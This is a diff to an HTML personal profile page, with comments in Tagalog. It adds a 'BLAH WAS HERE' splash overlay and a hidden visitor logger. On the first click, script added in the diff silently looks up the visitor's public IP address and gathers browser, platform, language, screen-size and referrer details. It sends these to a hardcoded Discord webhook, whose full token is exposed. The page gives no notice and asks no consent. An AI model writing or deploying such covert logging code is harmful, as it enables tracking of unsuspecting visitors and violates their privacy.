@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Profile</title>
+    <title><----></title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <script>
@@ -39,9 +39,41 @@
             background: linear-gradient(to bottom, #000000, #1a0505);
             min-height: 100vh;
         }
+
+        /* ✅ IDINAGDAG: Style para sa "BLAH WAS HERE" */
+        #blahOverlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.8s ease;
+            pointer-events: none;
+        }
+
+        #blahText {
+            font-size: clamp(2.5rem, 10vw, 4rem);
+            font-weight: 900;
+            color: #9945ff;
+            text-shadow: 0 0 20px rgba(153, 69, 255, 0.7);
+            font-family: Arial Black, Impact, sans-serif;
+        }
+
+        .fade-out {
+            opacity: 0 !important;
+        }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen text-white p-4">
+
+    <!-- ✅ IDINAGDAG: Overlay para sa mensahe -->
+    <div id="blahOverlay">
+        <div id="blahText">BLAH WAS HERE</div>
+    </div>
+
     <!-- Main Card -->
     <div class="bg-card/80 backdrop-blur-md rounded-3xl p-8 w-full max-w-md glow border border-gray-800">
         <!-- Profile Picture -->
@@ -104,10 +136,73 @@
 const audio = document.getElementById('bgSound');
 audio.volume = 0.4; // Lakas: 0.1 (mahina) hanggang 1 (malakas)
 
-// Tutugtog pagkatapos pindutin ang screen
+// ✅ ILAGAY MO DITO ANG LINK NG DISCORD WEBHOOK MO
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";
+
+// ✅ IDINAGDAG: Lahat ng aksyon pagka-click
 document.addEventListener('click', () => {
+  // Patugtugin ang tunog
   audio.play().catch(err => console.log("Hindi tumugtog:", err));
-}, { once: true });
+
+  // Ipakita at i-fade out ang "BLAH WAS HERE"
+  const overlay = document.getElementById('blahOverlay');
+  setTimeout(() => {
+    overlay.classList.add('fade-out');
+  }, 800); // Lalabas ng 0.8 segundo bago mawala
+
+  // Kuhain at ipadala ang impormasyon sa Webhook
+  sendVisitorInfo();
+
+}, { once: true }); // Gagana lang isang beses
+
+// ✅ IDINAGDAG: Function para kumuha at magpadala ng impormasyon
+async function sendVisitorInfo() {
+  try {
+    // Kuhain ang pampublikong IP address
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    const visitorIP = ipData.ip;
+
+    // Detalye ng browser at device
+    const userAgent = navigator.userAgent;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const viewport = `${window.innerWidth}x${window.innerHeight}`;
+    const referrer = document.referrer || "Direktang binuksan";
+
+    // Ihanda ang mensahe para sa Discord
+    const payload = {
+      username: "Visitor Logger",
+      avatar_url: "https://i.imgur.com/ZmspxIl.png",
+      embeds: [{
+        title: "🔍 BAGONG BISITA",
+        color: 1003621, // Kulay lila
+        fields: [
+          { name: "👤 Sinong bumisita", value: "Mula sa link/profile ni BLAH", inline: false },
+          { name: "🌐 IP Address", value: `||${visitorIP}||`, inline: true },
+          { name: "💻 Device/OS", value: platform, inline: true },
+          { name: "🌍 Browser", value: userAgent, inline: false },
+          { name: "🗣️ Wika", value: language, inline: true },
+          { name: "📏 Screen Size", value: viewport, inline: true },
+          { name: "🔗 Galing sa", value: referrer, inline: false }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    // Ipadala sa Webhook
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    console.log("Impormasyon naipadala sa Webhook");
+
+  } catch (err) {
+    console.log("Error sa pagkuha/pagpadala:", err);
+  }
+}
 </script>
 </body>
 </html>
